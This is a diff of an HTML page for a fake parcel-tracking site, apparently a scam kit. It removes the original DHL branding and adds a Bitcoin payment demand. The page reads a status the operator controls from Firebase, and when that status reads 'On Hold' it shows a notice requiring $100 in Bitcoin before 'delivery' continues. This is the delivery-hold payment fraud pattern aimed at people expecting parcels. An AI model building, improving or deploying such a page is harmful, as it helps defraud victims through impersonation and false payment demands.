@@ -1,99 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>DHL Tracking</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shipment Tracking</title>
 
 <style>
 body {
-    font-family: Arial;
-    background: #f5f5f5;
-    text-align: center;
+  font-family: Arial;
+  background: #f5f5f5;
+  display: flex;
+  justify-content: center;
 }
 
-.container {
-    background: white;
-    padding: 20px;
-    margin: 30px auto;
-    width: 90%;
-    max-width: 400px;
-    border-radius: 10px;
-}
-
-h2 {
-    color: #d40511;
+.card {
+  background: white;
+  width: 320px;
+  padding: 20px;
+  margin-top: 40px;
+  border-radius: 10px;
+  text-align: center;
 }
 
 .step {
-    display: flex;
-    align-items: center;
-    margin: 10px 0;
+  display: flex;
+  align-items: center;
+  margin: 10px 0;
 }
 
 .circle {
-    width: 25px;
-    height: 25px;
-    border-radius: 50%;
-    border: 2px solid gray;
-    margin-right: 10px;
+  width: 18px;
+  height: 18px;
+  border-radius: 50%;
+  border: 2px solid gray;
+  margin-right: 10px;
 }
 
 .done {
-    background: green;
+  background: blue;
+  border-color: blue;
 }
 
-.hold-box {
-    background: #ffe6e6;
-    padding: 15px;
-    margin-top: 15px;
-    border-radius: 8px;
+.hold {
+  background: #ffe5e5;
+  color: red;
+  padding: 10px;
+  margin-top: 15px;
+  border-radius: 5px;
 }
 
-button {
-    background: #d40511;
-    color: white;
-    padding: 10px;
-    border: none;
-    width: 100%;
-    margin-top: 10px;
-    border-radius: 5px;
-}
 </style>
-
 </head>
 
 <body>
 
-<div class="container">
-<h2>DHL Tracking</h2>
+<div class="card">
+<h2>Shipment Tracking</h2>
 
 <p><b>Status:</b> <span id="status"></span></p>
 <p><b>Location:</b> <span id="location"></span></p>
 
-<div class="step">
-<div id="c1" class="circle"></div> Shipment picked
-</div>
+<div class="step"><div id="c1" class="circle"></div> Shipment picked</div>
+<div class="step"><div id="c2" class="circle"></div> In transit</div>
+<div class="step"><div id="c3" class="circle"></div> Out for delivery</div>
+<div class="step"><div id="c4" class="circle"></div> Delivered</div>
 
-<div class="step">
-<div id="c2" class="circle"></div> In transit
-</div>
-
-<div class="step">
-<div id="c3" class="circle"></div> Out for delivery
-</div>
-
-<div class="step">
-<div id="c4" class="circle"></div> Delivered
-</div>
-
-<div id="hold" class="hold-box" style="display:none;">
-<p>Your package is currently on hold. Kindly complete the required payment to continue delivery.</p>
-<button>Make Payment</button>
+<div id="holdBox" class="hold" style="display:none;">
+ON HOLD – Payment Required ($100)
+<br><br>
+BTC: bc1qexamplewalletaddress123
 </div>
 
 </div>
 
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js"></script>
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
 
 <script>
 const firebaseConfig = {
@@ -102,24 +83,24 @@ const firebaseConfig = {
   projectId: "PASTE_YOURS",
 };
 
-const app = firebase.initializeApp(firebaseConfig);
+firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
 db.collection("tracking").doc("123456").onSnapshot((doc) => {
+  const data = doc.data();
 
-let data = doc.data();
+  document.getElementById("status").innerText = data.status;
+  document.getElementById("location").innerText = data.location;
 
-document.getElementById("status").innerText = data.status;
-document.getElementById("location").innerText = data.location;
-
-for(let i=1;i<=data.progress;i++){
+  // progress
+  for(let i=1; i<=data.progress; i++){
     document.getElementById("c"+i).classList.add("done");
-}
+  }
 
-if(data.status == "On Hold"){
-    document.getElementById("hold").style.display = "block";
-}
-
+  // hold message
+  if(data.status === "On Hold"){
+    document.getElementById("holdBox").style.display = "block";
+  }
 });
 </script>
 
